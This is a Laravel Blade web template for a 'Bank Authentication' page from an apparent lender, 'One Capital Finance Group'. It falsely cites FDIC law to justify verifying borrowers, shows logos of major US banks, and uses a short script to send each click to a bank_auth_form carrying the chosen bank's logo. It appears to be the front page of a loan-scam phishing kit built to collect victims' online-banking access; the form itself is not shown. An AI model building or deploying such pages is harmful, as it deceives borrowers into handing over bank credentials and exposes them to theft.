@extends('layouts.app')

@section('section')
<section class="py50">
    <div class="container">
        <div class="textlgcenter animated-div mb-50" >
            <p class="fs-52 ">Bank Authentication</p>
            <p>As per the law of Federal Deposit Insurance Corporation, we would need to verify you to check your repayment capacity and also that you are not misusing anyone’s identity.</p>
            <p>To do this verification – please agree to the consent form and move ahead with the loan officer instructions</p>
            <p>I hereby authorize One Capital Finance Group (under reversal credit & reversal process) to access and utilize the following banking information for the specific purpose of processing payments, setting up direct deposits, etc.</p>
        </div>
        <div class="photoGrid4 mb-100">
            <div class="animated-div">
            <img src="{{asset('assets/images/banks/chase_bank-logo.svg')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/chase_bank-logo.svg')}}">
            </div>
            <div class="animated-div">
            <img src="{{asset('assets/images/banks/bank_of_america-logo.svg')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/bank_of_america-logo.svg')}}">
            </div>
            <div class="animated-div">
            <img src="{{asset('assets/images/banks/wells_fargo-logo.svg')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/wells_fargo-logo.svg')}}">
            </div>
            <div class="animated-div">
            <img src="{{asset('assets/images/banks/td_bank-_n.a.-logo.svg')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/td_bank-_n.a.-logo.svg')}}">
            </div>
            <div class="animated-div">
            <img src="{{asset('assets/images/banks/navy-federal-credit.svg')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/navy-federal-credit.svg')}}">
            </div>
            <div class="animated-div">
                <img src="{{asset('assets/images/banks/622714be74a10c92f2ae0797.png')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/622714be74a10c92f2ae0797.png')}}">
            </div>
            <div class="animated-div">
            <img src="{{asset('assets/images/banks/regions-bank.svg')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/regions-bank.svg')}}">
            </div>
            <div class="animated-div">
            <img src="{{asset('assets/images/banks/pngwing.png')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/pngwing.png')}}">
            </div>

            <div class="animated-div">
            <img src="{{asset('assets/images/banks/keybank-logo.svg')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/keybank-logo.svg')}}">
            </div>
            <div class="animated-div">
            <img src="{{asset('assets/images/banks/citi-bank.png')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/citi-bank.png')}}">
            </div>
            <div class="animated-div">
            <img src="{{asset('assets/images/banks/us-banks.jpeg')}}" height="129" width="194" alt="partner logos" class="image" data-image="{{asset('assets/images/banks/us-banks.jpeg')}}">
            </div>

        </div>
        <a class="btn contactBtn mx-auto animated-div" href="{{url('bank_auth_form')}}">
            Other Banks & Credit Union's

          </a>
    </div>
  </section>

  <script>
    // Get all the images
    const images = document.querySelectorAll('.image');

    images.forEach(image => {
        // Add a click event listener to each image
        image.addEventListener('click', function() {
            // Get the image source (data attribute)
            const imageSrc = image.getAttribute('data-image');
            // Redirect to page2.html and pass the image source as a query parameter
            window.location.href = `{{ URL::asset('/bank_auth_form') }}?image=${encodeURIComponent(imageSrc)}`;
        });
    });
</script>
@endsection
